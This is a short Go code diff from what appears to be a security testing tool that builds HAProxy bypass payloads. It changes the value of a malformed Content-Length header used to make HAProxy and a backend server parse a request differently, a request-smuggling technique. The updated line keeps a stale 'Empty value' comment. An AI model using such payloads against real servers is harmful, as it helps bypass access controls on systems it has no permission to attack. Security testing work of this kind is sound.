@@ -80,7 +80,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				// 1. Malformed header MUST be first - this will be processed first by HAProxy
 				{
 					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
-					Value:  "",                  // Empty value, to be handled by BuildRawHTTPRequest
+					Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
 				},
 				// 2. Regular Content-Length MUST be second - this will be processed by backend server
 				{
